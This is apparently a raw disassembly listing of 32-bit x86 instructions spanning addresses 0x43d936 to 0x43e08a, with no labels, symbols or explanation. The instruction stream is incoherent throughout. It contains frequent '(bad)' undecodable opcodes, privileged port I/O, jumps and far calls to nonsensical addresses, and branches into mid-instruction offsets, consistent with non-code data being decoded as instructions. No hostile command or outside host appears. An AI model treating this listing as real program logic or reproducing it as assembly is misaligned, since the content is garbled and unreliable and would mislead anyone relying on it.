  43d936:	inc    ebp
  43d937:	shl    DWORD PTR [edx-0xab6b494],cl
  43d93d:	popf   
  43d93e:	mov    ah,0x14
  43d940:	sbb    dh,0xb
  43d943:	xchg   DWORD PTR es:[edi+0x1b88e731],ebx
  43d94a:	icebp  
  43d94b:	jmp    0xffca:0xbad786c9
  43d952:	fadd   st,st(2)
  43d954:	rcr    DWORD PTR ds:0x27abb80a,0xf3
  43d95b:	jmp    0x1b2ad963
  43d960:	mov    esi,0x1d589b88
  43d965:	repz in al,0x1a
  43d968:	sahf   
  43d969:	stos   DWORD PTR es:[edi],eax
  43d96a:	daa    
  43d96b:	les    esi,FWORD PTR [esi]
  43d96d:	pushf  
  43d96e:	out    0xe2,al
  43d970:	push   0x1a
  43d972:	push   edx
  43d973:	(bad)  
  43d975:	xchg   BYTE PTR [edi+0x769c1eb4],ah
  43d97b:	cdq    
  43d97c:	mov    dh,0x3e
  43d97e:	fistp  WORD PTR [edi-0x5c]
  43d981:	or     esp,ecx
  43d983:	cwde   
  43d984:	lea    edx,[edi-0xacaa4de]
  43d98a:	add    eax,0x6203e9b4
  43d98f:	fld    DWORD PTR [eax]
  43d991:	push   0xffffffd9
  43d993:	xlat   BYTE PTR ds:[ebx]
  43d994:	ins    DWORD PTR es:[edi],dx
  43d995:	scas   al,BYTE PTR es:[edi]
  43d996:	fisub  DWORD PTR [ecx]
  43d998:	push   ebp
  43d999:	ins    BYTE PTR es:[edi],dx
  43d99a:	pop    ss
  43d99b:	sub    al,0x0
  43d99d:	jb     0x43d9bf
  43d99f:	icebp  
  43d9a0:	add    ebp,DWORD PTR [eax-0x56cd49fb]
  43d9a6:	fisttp QWORD PTR [ecx]
  43d9a8:	gs push ebx
  43d9aa:	pop    edi
  43d9ab:	(bad)  
  43d9ac:	rcr    DWORD PTR [ebx],1
  43d9ae:	jbe    0x43d9b7
  43d9b0:	jmp    0xf7f7757a
  43d9b5:	bound  esp,QWORD PTR [eax]
  43d9b7:	inc    ebp
  43d9b8:	mov    edi,fs
  43d9ba:	fcom   QWORD PTR [edi+0x15207010]
  43d9c0:	jmp    0xb10cda2a
  43d9c5:	mul    DWORD PTR [edx+0x58]
  43d9c8:	push   es
  43d9c9:	rol    eax,0x1e
  43d9cc:	leave  
  43d9cd:	push   edi
  43d9ce:	out    dx,al
  43d9cf:	bnd jae 0x43d955
  43d9d2:	test   eax,0x6ac4105c
  43d9d7:	or     BYTE PTR [esi+ecx*1-0x17],dl
  43d9db:	popa   
  43d9dc:	fldcw  WORD PTR [edx+eiz*1-0x13]
  43d9e0:	and    BYTE PTR [ebp+0x6c],dl
  43d9e3:	daa    
  43d9e4:	sub    eax,DWORD PTR [eax]
  43d9e6:	bound  esp,QWORD PTR [eax-0xad7fc0f]
  43d9ec:	mov    ah,0x32
  43d9ee:	sub    ebp,ebp
  43d9f0:	or     BYTE PTR [ebp-0x3d],ah
  43d9f3:	popa   
  43d9f4:	cld    
  43d9f5:	rcr    DWORD PTR [ebx+0x4de90771],1
  43d9fb:	or     esi,DWORD PTR [ebx+0x45a072f7]
  43da01:	mov    edi,ss
  43da03:	fcom   QWORD PTR [esi+0x15a06010]
  43da09:	jmp    0xf8c3910e
  43da0e:	push   DWORD PTR [eax-0x21]
  43da11:	jne    0x43da8c
  43da13:	sbb    edx,edi
  43da15:	or     DWORD PTR [ecx+ebx*8-0x3c0007b1],eax
  43da1c:	fld    QWORD PTR [eax]
  43da1e:	add    bl,cl
  43da20:	out    dx,eax
  43da21:	pop    ebx
  43da22:	ret    
  43da23:	xchg   esi,eax
  43da24:	(bad)  
  43da25:	jmp    0x43da7d
  43da27:	add    BYTE PTR [eax-0x37],al
  43da2a:	or     BYTE PTR [edi+0x65],dl
  43da2d:	test   DWORD PTR [ebp-0x12],edx
  43da30:	cld    
  43da31:	dec    edi
  43da32:	jl     0x43da2c
  43da34:	inc    esi
  43da35:	dec    edi
  43da36:	jb     0x43da42
  43da38:	inc    eax
  43da39:	enter  0xe814,0x7
  43da3d:	inc    esi
  43da3e:	clc    
  43da3f:	call   DWORD PTR [eax]
  43da41:	xchg   edi,eax
  43da42:	pop    eax
  43da43:	pop    esi
  43da44:	dec    esi
  43da45:	fwait
  43da46:	add    eax,DWORD PTR [eax]
  43da48:	out    dx,eax
  43da49:	call   0xcccb:0x9acfcccb
  43da50:	iret   
  43da51:	call   0x51eb:0x6256cccb
  43da58:	push   ebp
  43da59:	out    0x7d,al
  43da5b:	jge    0x43dad0
  43da5d:	pop    ecx
  43da5e:	clc    
  43da5f:	(bad)  
  43da61:	push   ss
  43da62:	or     DWORD PTR [eax],eax
  43da64:	dec    ebx
  43da65:	arpl   WORD PTR [eax+0x1c],si
  43da68:	(bad)  
  43da69:	dec    eax
  43da6a:	or     BYTE PTR [esi+eax*2-0x4fffff22],al
  43da71:	and    DWORD PTR ds:0x9d97283,eax
  43da77:	xchg   DWORD PTR [edx-0x1b],esp
  43da7a:	add    BYTE PTR [eax],al
  43da7c:	mov    eax,0xc0004cf
  43da81:	xor    dl,BYTE PTR [eax]
  43da83:	or     BYTE PTR [edx-0x40],ah
  43da86:	add    edi,DWORD PTR [ebp+0x4d]
  43da89:	rcl    BYTE PTR [eax],0x6
  43da8c:	add    cl,ah
  43da8e:	pop    edx
  43da8f:	idiv   edi
  43da91:	ins    BYTE PTR es:[edi],dx
  43da92:	cmp    eax,0xc0620805
  43da97:	xchg   BYTE PTR [ecx+0x66],al
  43da9a:	test   DWORD PTR [ebp-0x3],esi
  43da9d:	in     eax,0xbf
  43da9f:	push   es
  43daa0:	pop    es
  43daa1:	loope  0x43da5b
  43daa3:	add    BYTE PTR [ecx],cl
  43daa5:	fist   WORD PTR [ecx+0x3f620001]
  43daab:	sbb    dl,BYTE PTR [eax]
  43daad:	(bad)  
  43daae:	cmc    
  43daaf:	lock shl BYTE PTR ds:0x229ffdb8,0xc0
  43dab7:	cmp    BYTE PTR [eax-0x7667d57],bh
  43dabd:	add    al,0x27
  43dabf:	cwde   
  43dac0:	pop    edx
  43dac1:	mov    al,ds:0x2c8503a7
  43dac6:	cwde   
  43dac7:	sub    al,0x87
  43dac9:	dec    esp
  43daca:	cmp    DWORD PTR [eax],ebp
  43dacc:	cld    
  43dacd:	fucomi st,st(1)
  43dacf:	in     al,0xb4
  43dad1:	arpl   ax,ax
  43dad3:	add    eax,DWORD PTR [eax]
  43dad5:	loope  0x43dafe
  43dad7:	out    0x8,eax
  43dad9:	out    0x20,eax
  43dadb:	(bad)  
  43dadc:	jmp    DWORD PTR [edx+0x76]
  43dadf:	(bad)  
  43dae0:	jmp    DWORD PTR [edx-0x3e]
  43dae3:	ficom  DWORD PTR [ecx+0x7a]
  43dae6:	mov    bh,0x76
  43dae8:	stc    
  43dae9:	arpl   dx,ax
  43daeb:	add    esp,DWORD PTR [esi+0x62]
  43daee:	mov    WORD PTR [ebx],es
  43daf0:	data16 add BYTE PTR [edx+0xa],ah
  43daf4:	cmp    ah,BYTE PTR [ebx]
  43daf6:	(bad)  
  43daf8:	mov    al,BYTE PTR [eax+0x72]
  43dafb:	cmp    ecx,DWORD PTR [ebx+0x14]
  43dafe:	(bad)  
  43db00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43db01:	or     esp,DWORD PTR [eax]
  43db03:	(bad)  
  43db04:	icebp  
  43db05:	clc    
  43db06:	adc    al,0xf
  43db08:	test   BYTE PTR [ebx+eiz*4+0x5a3262c5],0x97
  43db10:	in     eax,0xf3
  43db12:	out    0xda,al
  43db14:	xchg   edi,eax
  43db15:	out    dx,eax
  43db16:	ficom  WORD PTR [edi]
  43db18:	(bad)  
  43db19:	mov    WORD PTR [ebx+0x5a001fe1],ds
  43db1f:	loope  0x43db09
  43db21:	cmp    DWORD PTR [esi+0x64],esi
  43db24:	pop    ds
  43db25:	clc    
  43db26:	ficomp WORD PTR [edi]
  43db28:	test   BYTE PTR [edx-0x3ca31ee8],0x5a
  43db2f:	push   esi
  43db30:	jo     0x43db35
  43db32:	(bad)  
  43db33:	fnstenv [edx+0x31]
  43db36:	push   0x61
  43db38:	in     eax,0xf2
  43db3a:	lods   al,BYTE PTR ds:[esi]
  43db3b:	push   cs
  43db3c:	into   
  43db3d:	mov    WORD PTR [ebx],fs
  43db3f:	lds    esi,FWORD PTR [edx+0x49]
  43db42:	push   0xffffff97
  43db44:	fisttp QWORD PTR [ebx]
  43db46:	(bad)  
  43db47:	fisubr DWORD PTR [edi]
  43db49:	lock out 0x17,al
  43db4c:	out    dx,al
  43db4d:	mov    WORD PTR [ebx],?
  43db4f:	loope  0x43daf8
  43db51:	jmp    FWORD PTR [ebp-0x27]
  43db54:	call   0x6491db92
  43db59:	daa    
  43db5a:	lock out 0x1f,al
  43db5d:	loop   0x43db20
  43db5f:	popa   
  43db60:	loope  0x43db4b
  43db62:	add    bh,BYTE PTR [eax+0x6e4172c5]
  43db68:	fs mov bh,0xb
  43db6b:	and    ch,dl
  43db6d:	stc    
  43db6e:	add    eax,DWORD PTR [ebp+0xe]
  43db71:	(bad)  
  43db72:	mov    ebx,fs
  43db74:	push   esp
  43db75:	jmp    0xa83d7d
  43db7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43db7b:	cmp    eax,0x54e0f92d
  43db80:	fadd   QWORD PTR [ebp+0xfb660aa]
  43db86:	push   0xffffffbb
  43db88:	pop    eax
  43db89:	add    cl,ch
  43db8b:	popa   
  43db8c:	scas   eax,DWORD PTR es:[edi]
  43db8d:	je     0x43db6f
  43db8f:	fisub  WORD PTR [edi-0x3027afe]
  43db95:	rcl    BYTE PTR [edx],0xf4
  43db98:	addr16 cld 
  43db9a:	call   0x97cfb500
  43db9f:	pop    ecx
  43dba0:	popa   
  43dba1:	cld    
  43dba2:	mul    DWORD PTR [esi+0x13]
  43dba5:	or     eax,0x8bc59472
  43dbaa:	daa    
  43dbab:	pop    esi
  43dbac:	fwait
  43dbad:	cld    
  43dbae:	loopne 0x43dc08
  43dbb0:	mov    al,0x55
  43dbb2:	(bad)  
  43dbb4:	sbb    ebp,edi
  43dbb6:	aaa    
  43dbb7:	pop    esi
  43dbb8:	fld    DWORD PTR [eax]
  43dbba:	rol    BYTE PTR [eax],0xa2
  43dbbd:	scas   al,BYTE PTR es:[edi]
  43dbbe:	imul   ecx
  43dbc0:	fcomp  DWORD PTR [edi]
  43dbc2:	sbb    eax,0xeffd2e72
  43dbc7:	ret    
  43dbc8:	cwde   
  43dbc9:	popf   
  43dbca:	or     BYTE PTR [ebx-0xc26576a],0x96
  43dbd1:	das    
  43dbd2:	loop   0x43dbbf
  43dbd4:	arpl   WORD PTR [eax-0x5785ce75],sp
  43dbda:	(bad)  
  43dbdc:	sahf   
  43dbdd:	das    
  43dbde:	loop   0x43dbc1
  43dbe0:	arpl   WORD PTR [eax-0x55ae4e75],sp
  43dbe6:	fld    DWORD PTR [ebx]
  43dbe8:	daa    
  43dbe9:	das    
  43dbea:	loop   0x43dbd9
  43dbec:	arpl   WORD PTR [esi+0x545e1183],bx
  43dbf2:	inc    esi
  43dbf3:	add    BYTE PTR [ebx],dh
  43dbf5:	fcom   DWORD PTR [ebx+0x7c6b49c0]
  43dbfb:	inc    ebp
  43dbfc:	inc    ebx
  43dbfd:	arpl   WORD PTR [ebx],dx
  43dbff:	or     BYTE PTR [edx],bh
  43dc01:	in     eax,0xc
  43dc03:	mov    ecx,ebp
  43dc05:	mov    esi,0xd8174e7c
  43dc0a:	mov    dl,0x49
  43dc0c:	jmp    DWORD PTR [ebx+0x51]
  43dc0f:	or     BYTE PTR [ebx-0x3afeef1f],al
  43dc15:	mov    esi,0xd817567c
  43dc1a:	mov    dl,0x52
  43dc1c:	(bad)  
  43dc1d:	arpl   WORD PTR [ecx+0x14],ax
  43dc20:	add    BYTE PTR [eax-0x2077f6e9],al
  43dc26:	loop   0x43dc1f
  43dc28:	pop    ebp
  43dc29:	iret   
  43dc2a:	arpl   WORD PTR [ecx+0x1c],cx
  43dc2d:	les    ebx,FWORD PTR [edi+edi*1]
  43dc30:	push   es
  43dc31:	inc    eax
  43dc32:	in     al,dx
  43dc33:	or     al,0x8b
  43dc35:	pop    ebp
  43dc36:	fisttp QWORD PTR [eax+0x5ad59b0c]
  43dc3c:	adc    al,0x40
  43dc3e:	cld    
  43dc3f:	adc    al,0xf
  43dc41:	sub    eax,0x4d8b01e8
  43dc46:	test   eax,0x62934e7c
  43dc4b:	adc    ecx,DWORD PTR [eax]
  43dc4d:	jp     0x43dc33
  43dc4f:	or     al,0x8b
  43dc51:	std    
  43dc52:	sub    eax,0x638bfff8
  43dc57:	dec    ecx
  43dc58:	adc    al,0x8
  43dc5a:	push   edx
  43dc5b:	(bad)  
  43dc5c:	je     0x43dcda
  43dc5e:	adc    dh,dh
  43dc60:	(bad)  
  43dc61:	jnp    0x43dc3d
  43dc63:	fst    QWORD PTR [edi]
  43dc65:	enter  0x8004,0x0
  43dc69:	dec    ebx
  43dc6a:	(bad)  
  43dc6c:	jl     0x43dcd0
  43dc6e:	mov    ecx,0x9c60f782
  43dc73:	imul   DWORD PTR [edx+eiz*1]
  43dc76:	or     eax,DWORD PTR [ecx]
  43dc78:	mov    eax,0x3c05e
  43dc7d:	(bad)  [ebp+0xb]
  43dc80:	mov    BYTE PTR [esi-0x6f],bl
  43dc83:	cld    
  43dc84:	pop    ecx
  43dc85:	add    BYTE PTR [esi+0x2b],dh
  43dc88:	ds sbb al,0xe9
  43dc8b:	jne    0x43dc74
  43dc8d:	test   DWORD PTR [ebx+0x5a518ab4],ebx
  43dc93:	cmp    BYTE PTR [eax],al
  43dc95:	adc    BYTE PTR [ebx+0x76],ah
  43dc98:	out    0x84,eax
  43dc9a:	pushf  
  43dc9b:	mov    WORD PTR [edx-0x753fad89],es
  43dca1:	dec    ecx
  43dca2:	dec    esi
  43dca3:	and    al,0xdd
  43dca5:	test   DWORD PTR [edx],esp
  43dca7:	lods   al,BYTE PTR ds:[esi]
  43dca8:	mov    BYTE PTR [ecx+0x6a],dl
  43dcab:	sub    BYTE PTR [ecx],al
  43dcad:	packsswb mm4,mm6
  43dcb0:	lock test BYTE PTR [esp+edi*4],dl
  43dcb4:	mov    DWORD PTR [esi+0x57],eax
  43dcb7:	sub    esi,DWORD PTR [edi]
  43dcb9:	adc    al,0xe9
  43dcbb:	lds    eax,FWORD PTR [eax+ecx*4]
  43dcbe:	pop    esi
  43dcbf:	nop
  43dcc0:	add    bl,BYTE PTR [edx+0x4e]
  43dcc3:	cmp    edi,DWORD PTR [edi]
  43dcc5:	adc    al,0xe9
  43dcc7:	in     eax,dx
  43dcc8:	clc    
  43dcc9:	jl     0x43dce3
  43dccb:	pushf  
  43dccc:	add    esi,DWORD PTR [ebx+esi*2+0x3b]
  43dcd0:	aaa    
  43dcd1:	or     BYTE PTR [ebx],dh
  43dcd3:	cmp    edi,DWORD PTR [esi]
  43dcd5:	xor    BYTE PTR [edx],dl
  43dcd7:	shl    DWORD PTR [ebp+edi*2-0x78fc3fbf],1
  43dcde:	and    eax,0x4241b470
  43dce3:	rol    BYTE PTR [ebx],0x0
  43dce6:	(bad)  
  43dce7:	fldenv [esi]
  43dce9:	add    BYTE PTR ds:[esi+0x16],bl
  43dced:	jmp    0x6204:0x74c26203
  43dcf4:	fldenv [edx+0x46]
  43dcf7:	jb     0x43dd51
  43dcf9:	push   eax
  43dcfa:	or     al,0xf5
  43dcfc:	mov    edx,0xd9ec82e5
  43dd01:	loope  0x43dd06
  43dd03:	(bad)
  43dd08:	lods   eax,DWORD PTR ds:[esi]
  43dd09:	jmp    0x5fa41f24
  43dd0e:	or     BYTE PTR ds:0xc7d8e9ad,0x2d
  43dd15:	lock xor ch,0xd3
  43dd19:	jl     0x43dd1a
  43dd1b:	ficomp WORD PTR [eax-0x78c0faee]
  43dd21:	push   0xffffff9c
  43dd23:	arpl   sp,bx
  43dd25:	dec    esp
  43dd26:	ret    0x17e8
  43dd29:	in     al,dx
  43dd2a:	test   al,0xd7
  43dd2c:	out    0xa9,eax
  43dd2e:	ret    0xd3ad
  43dd31:	loop   0x43dcfe
  43dd33:	inc    esi
  43dd34:	sub    esi,DWORD PTR [esi]
  43dd36:	add    al,0x36
  43dd38:	fsubr  DWORD PTR [edx-0x36]
  43dd3b:	push   ebp
  43dd3c:	jno    0x43dd9a
  43dd3e:	rep outs dx,DWORD PTR ds:[esi]
  43dd40:	loope  0x43dcf8
  43dd42:	mov    ds:0xaa989f7e,al
  43dd47:	call   0x7e06d121
  43dd4c:	aad    0xea
  43dd4e:	rol    BYTE PTR [eax],0xe6
  43dd51:	mov    eax,ds:0x60a2a8
  43dd56:	mov    ds:0x2794a388,al
  43dd5b:	add    BYTE PTR ds:0x7a03e9d9,al
  43dd61:	sahf   
  43dd62:	add    BYTE PTR [edx-0x107c4e32],al
  43dd68:	test   ecx,ebx
  43dd6a:	ins    BYTE PTR es:[edi],dx
  43dd6b:	sti    
  43dd6c:	pop    esi
  43dd6d:	push   0x47
  43dd6f:	sbb    edi,esi
  43dd71:	jno    0x43dd5e
  43dd73:	push   esi
  43dd74:	out    dx,al
  43dd75:	loopne 0x43dd26
  43dd77:	sahf   
  43dd78:	adc    DWORD PTR [ebp+ebp*4+0x6ab0ce52],esi
  43dd7f:	jmp    0xe9aeb6ff
  43dd84:	stc    
  43dd85:	cmc    
  43dd86:	xor    al,0xe9
  43dd88:	popa   
  43dd89:	push   esp
  43dd8a:	aas    
  43dd8b:	(bad)  
  43dd8d:	xor    ebp,edi
  43dd8f:	mov    ds:0xe9c35866,eax
  43dd94:	popa   
  43dd95:	(bad)  [ebx+0x792cf5a7]
  43dd9b:	fldenv [ecx-0x1e]
  43dd9e:	jl     0x43ddee
  43dda0:	popa   
  43dda1:	fld    DWORD PTR [eax]
  43dda3:	out    0x96,al
  43dda5:	in     al,dx
  43dda6:	or     al,0x62
  43dda8:	daa    
  43dda9:	lds    ecx,FWORD PTR [ecx+0x3ee2d634]
  43ddaf:	or     DWORD PTR [ebp+0x34],esi
  43ddb2:	xchg   ecx,eax
  43ddb3:	bound  eax,QWORD PTR [eax]
  43ddb5:	sbb    ch,al
  43ddb7:	cmp    esp,DWORD PTR [edi]
  43ddb9:	bound  ebp,QWORD PTR [eax]
  43ddbb:	sub    eax,0x83cd7872
  43ddc0:	inc    ebx
  43ddc1:	ret    0x73ab
  43ddc4:	rcl    BYTE PTR [edx+ebp*2+0x6abcd46e],1
  43ddcb:	push   eax
  43ddcc:	jb     0x43ddf6
  43ddce:	loope  0x43ddd3
  43ddd0:	test   al,0xd
  43ddd2:	and    DWORD PTR [ecx],esi
  43ddd4:	cmp    DWORD PTR [edi-0x3f],ecx
  43ddd7:	mov    ebx,ecx
  43ddd9:	popa   
  43ddda:	(bad)  [ecx-0x207abc00]
  43dde0:	adc    eax,0x358bf847
  43dde6:	mov    cl,0x7c
  43dde8:	enter  0x18c2,0x9
  43ddec:	cmp    eax,DWORD PTR ds:0xd02c73ab
  43ddf2:	out    dx,eax
  43ddf3:	adc    al,0x8b
  43ddf5:	add    DWORD PTR [edi+0x2b6b567c],esp
  43ddfb:	or     al,0x11
  43ddfd:	mov    al,0xe7
  43ddff:	or     BYTE PTR [eax+0x4d7cbf3f],cl
  43de05:	inc    ebx
  43de06:	pop    ds
  43de07:	idiv   edi
  43de09:	or     edx,edi
  43de0b:	test   DWORD PTR [ebp+0x17],0x902042d6
  43de12:	out    dx,eax
  43de13:	adc    al,0xf
  43de15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43de16:	adc    ecx,DWORD PTR ds:0xb6c50039
  43de1c:	gs cwde 
  43de1e:	jo     0x43de0f
  43de20:	adc    al,0x83
  43de22:	loope  0x43ddae
  43de24:	div    DWORD PTR [ebx+0xf]
  43de27:	sub    al,0x42
  43de29:	adc    al,0x10
  43de2b:	xchg   esi,eax
  43de2c:	jno    0x43de43
  43de2e:	jo     0x43ddc4
  43de30:	inc    edi
  43de31:	mov    eax,DWORD PTR [ebp+0x40c0f4ad]
  43de37:	pop    ss
  43de38:	xor    DWORD PTR [eax+0x7a],edx
  43de3b:	dec    ebp
  43de3c:	and    DWORD PTR [edx],esp
  43de3e:	retf   
  43de3f:	(bad)  
  43de40:	jg     0x43de89
  43de42:	stos   DWORD PTR es:[edi],eax
  43de43:	sub    edx,DWORD PTR [edx+0x1c]
  43de46:	inc    eax
  43de47:	and    BYTE PTR [ecx],ah
  43de49:	cmp    ecx,DWORD PTR [ecx-0x4f]
  43de4c:	jb     0x43de5c
  43de4e:	les    esp,FWORD PTR [eax]
  43de50:	and    DWORD PTR [eax],eax
  43de52:	jnp    0x43de2a
  43de54:	add    bh,al
  43de56:	(bad)  
  43de57:	cli    
  43de58:	or     BYTE PTR [edi+0x62],al
  43de5b:	rol    BYTE PTR [ebx],0x7d
  43de5e:	hlt    
  43de5f:	mov    ebx,0x21e70934
  43de64:	add    al,0x0
  43de66:	bound  esi,QWORD PTR [edi]
  43de68:	inc    edx
  43de69:	sbb    al,0xe1
  43de6b:	test   al,0xe7
  43de6d:	jmp    DWORD PTR [esp+edi*1-0x7f]
  43de71:	dec    DWORD PTR [ebp-0x40]
  43de74:	jbe    0x43dec7
  43de76:	outs   dx,BYTE PTR ds:[esi]
  43de77:	aaa    
  43de78:	dec    edx
  43de79:	adc    al,0x79
  43de7b:	jb     0x43de74
  43de7d:	jb     0x43de7f
  43de7f:	jae    0x43dea8
  43de81:	inc    edx
  43de82:	sbb    al,0xe1
  43de84:	cwde   
  43de85:	xlat   BYTE PTR ds:[ebx]
  43de86:	push   DWORD PTR [ecx-0x6b423977]
  43de8c:	test   DWORD PTR [esi+0x48],esi
  43de8f:	push   edx
  43de90:	xchg   DWORD PTR [ebp-0x48e26b1],edi
  43de96:	cld    
  43de97:	and    esi,DWORD PTR [eax+0x2c]
  43de9a:	call   0x477fca
  43de9f:	jmp    0x43df1b
  43dea1:	shl    edi,cl
  43dea3:	and    eax,esi
  43dea5:	xchg   edx,eax
  43dea6:	clc    
  43dea7:	fnstcw WORD PTR [ecx-0x11]
  43deaa:	test   BYTE PTR [edx+0x4e0c4966],dh
  43deb0:	loopne 0x43df27
  43deb2:	dec    ecx
  43deb3:	and    BYTE PTR [edi],0x33
  43deb6:	sbb    al,0xd9
  43deb8:	out    0xf0,al
  43deba:	or     ah,dh
  43debc:	mov    ebx,0xe1eb3ef4
  43dec1:	fadd   QWORD PTR [esp+ebx*1+0x5a1b7ba8]
  43dec8:	arpl   WORD PTR [edx+0x14],cx
  43decb:	out    0x46,eax
  43decd:	xcrypt-ecb (bad)
  43dece:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43decf:	mov    eax,ebx
  43ded1:	in     al,0x4c
  43ded3:	mov    WORD PTR [ecx+0x12df03e9],gs
  43ded9:	out    dx,al
  43deda:	test   ch,dh
  43dedc:	cld    
  43dedd:	jmp    0x27a234f9
  43dee2:	clc    
  43dee3:	add    BYTE PTR [esi],dh
  43dee5:	xchg   edi,eax
  43dee6:	out    dx,eax
  43dee7:	neg    dh
  43dee9:	sbb    ah,dl
  43deeb:	fcomp  QWORD PTR [edi]
  43deed:	or     ch,bl
  43deef:	mov    ebp,0x331a10de
  43def4:	pushf  
  43def5:	mov    cl,0xd9
  43def7:	loop   0x43df3e
  43def9:	test   eax,0x5e724960
  43defe:	xor    dl,BYTE PTR [edi]
  43df00:	pop    esp
  43df01:	push   edx
  43df02:	lahf   
  43df03:	jecxz  0x43df27
  43df05:	and    dh,bl
  43df07:	sub    al,0x62
  43df09:	fldl2t 
  43df0b:	test   BYTE PTR [ebx-0x1eff6d23],bl
  43df11:	jl     0x43defc
  43df13:	add    esp,DWORD PTR [edx+0x54]
  43df16:	lahf   
  43df17:	out    dx,eax
  43df18:	xchg   BYTE PTR [ecx],ah
  43df1a:	mov    BYTE PTR [ebx],0x6b
  43df1d:	pop    ebp
  43df1e:	push   esi
  43df1f:	add    al,0x62
  43df21:	fnstenv [edx+0x3a]
  43df24:	push   esi
  43df25:	mov    ah,0xea
  43df27:	jle    0x43dec5
  43df29:	fldenv [edx+0x4a]
  43df2c:	jbe    0x43df12
  43df2e:	lahf   
  43df2f:	call   DWORD PTR [eax-0x16]
  43df32:	jb     0x43df75
  43df34:	outs   dx,BYTE PTR ds:[esi]
  43df35:	pop    esp
  43df36:	pusha  
  43df37:	loopne 0x43defe
  43df39:	sub    al,0xf1
  43df3b:	int3   
  43df3c:	jmp    FWORD PTR [edi]
  43df3e:	in     eax,dx
  43df3f:	jl     0x43df6b
  43df41:	jmp    0x5461a558
  43df46:	pop    ds
  43df47:	cld    
  43df48:	add    BYTE PTR [esi+0x5119009a],ah
  43df4e:	mov    cl,0x19
  43df50:	or     BYTE PTR [esi-0x27],bl
  43df53:	mov    DWORD PTR [esi],ebp
  43df55:	mov    dh,0xc0
  43df57:	adc    DWORD PTR [ebx+0x2f8ba1f2],edx
  43df5d:	jp     0x43dfbc
  43df5f:	rcl    dl,1
  43df61:	sub    edx,ebp
  43df63:	ins    BYTE PTR es:[edi],dx
  43df64:	leave  
  43df65:	out    dx,al
  43df66:	adc    DWORD PTR [ecx],esp
  43df68:	jb     0x43df9d
  43df6a:	lds    ecx,FWORD PTR [ebx-0x512eb5ee]
  43df70:	int    0x56
  43df72:	out    0x89,eax
  43df74:	mov    bh,0x41
  43df76:	pop    ebp
  43df77:	inc    esi
  43df78:	icebp  
  43df79:	leave  
  43df7a:	les    ecx,FWORD PTR [eax]
  43df7c:	push   esi
  43df7d:	stos   DWORD PTR es:[edi],eax
  43df7e:	int    0x7d
  43df80:	xor    cl,BYTE PTR [eax+eax*4-0x15]
  43df84:	in     al,dx
  43df85:	sahf   
  43df86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43df87:	imul   ecx
  43df89:	popa   
  43df8a:	pop    esi
  43df8b:	ds aad 0xe6
  43df8e:	das    
  43df8f:	and    eax,0x8bc56de9
  43df94:	scas   eax,DWORD PTR es:[edi]
  43df95:	adc    eax,0xc97c2ed
  43df9a:	pop    ebp
  43df9b:	inc    esi
  43df9c:	loope  0x43dfbc
  43df9e:	push   ax
  43dfa0:	jmp    0x1730:0xb94f5cb7
  43dfa7:	jmp    0xf7ebe0d5
  43dfac:	pusha  
  43dfad:	add    BYTE PTR [edx],ch
  43dfaf:	jmp    0xdaaff231
  43dfb4:	mov    edi,0x13a5a2f
  43dfb9:	jmp    0xedbb061f
  43dfbe:	test   BYTE PTR [edx+ebx*2],ch
  43dfc1:	bound  ebx,QWORD PTR [eax*8-0x46dcff7d]
  43dfc8:	div    DWORD PTR [ebx+0x72]
  43dfcb:	and    al,0x4a
  43dfcd:	adc    al,0x8
  43dfcf:	sahf   
  43dfd0:	cmc    
  43dfd1:	cmp    dh,BYTE PTR [ebp-0x27]
  43dfd4:	jb     0x43dfdb
  43dfd6:	repz sub ebx,edi
  43dfd9:	jmp    esp
  43dfdb:	and    eax,DWORD PTR [edx+0x14]
  43dfde:	push   es
  43dfdf:	in     eax,dx
  43dfe0:	idiv   BYTE PTR [edx]
  43dfe2:	sub    eax,0xf13571d9
  43dfe7:	out    dx,eax
  43dfe8:	xor    BYTE PTR [ebx+0x147fa535],cl
  43dfee:	inc    ebx
  43dfef:	and    al,0x52
  43dff1:	or     BYTE PTR [edx+0x3b0000dc],dl
  43dff7:	fimul  WORD PTR [edx+0x14]
  43dffa:	rcr    BYTE PTR [edi],1
  43dffc:	or     eax,0x5d8df48a
  43e001:	add    BYTE PTR [ecx],ah
  43e003:	fisttp DWORD PTR [eax+0x4ade0b1c]
  43e009:	adc    al,0x11
  43e00b:	fucomi st,st(0)
  43e00d:	pop    ebp
  43e00e:	imul   ebx,ebp,0x0
  43e011:	mov    DWORD PTR [eax],eax
  43e013:	mov    esp,0xff46c08a
  43e018:	int    0x0
  43e01a:	add    bl,bh
  43e01c:	pop    ebx
  43e01d:	jns    0x43e033
  43e01f:	or     ecx,edi
  43e021:	sbb    ebp,eax
  43e023:	ret    
  43e024:	inc    ebp
  43e025:	clc    
  43e026:	(bad)  
  43e027:	js     0x43dfff
  43e029:	adc    BYTE PTR [eax],al
  43e02b:	outs   dx,BYTE PTR ds:[esi]
  43e02c:	hlt    
  43e02d:	rol    DWORD PTR [esi-0x5d],0x57
  43e031:	clc    
  43e032:	inc    esp
  43e034:	repz pop ecx
  43e036:	xor    edi,ebx
  43e038:	hlt    
  43e039:	jge    0x43e020
  43e03b:	xchg   BYTE PTR [ebx+0x3362ffff],bl
  43e041:	pop    es
  43e042:	add    al,0x62
  43e044:	or     eax,0x9c27853f
  43e049:	rol    dh,cl
  43e04b:	loope  0x43dfe5
  43e04d:	dec    DWORD PTR [eax]
  43e04f:	cld    
  43e050:	jno    0x43dfd2
  43e052:	adc    esp,DWORD PTR [edx+0x3b]
  43e055:	dec    ecx
  43e056:	or     al,0xdf
  43e058:	fdiv   st(4),st
  43e05a:	inc    esi
  43e05b:	loope  0x43e0ae
  43e05d:	hlt    
  43e05e:	and    al,0x93
  43e060:	xor    DWORD PTR [esp+edi*2-0x66094386],0xffffffa3
  43e068:	jmp    0x8b9fbef0
  43e06d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e06e:	xor    al,0x38
  43e070:	scas   eax,DWORD PTR es:[edi]
  43e071:	lock jl 0x43e0ce
  43e074:	mov    esp,0xa900180f
  43e079:	idiv   DWORD PTR [esi]
  43e07b:	sbb    BYTE PTR [eax+0x50],ah
  43e07e:	inc    ebx
  43e07f:	add    BYTE PTR [ebp+0x35f88a48],bl
  43e085:	pop    ss
  43e086:	test   DWORD PTR es:[edi+0x7d],eax
  43e08a:	rol    DWORD PTR [edi],0x62
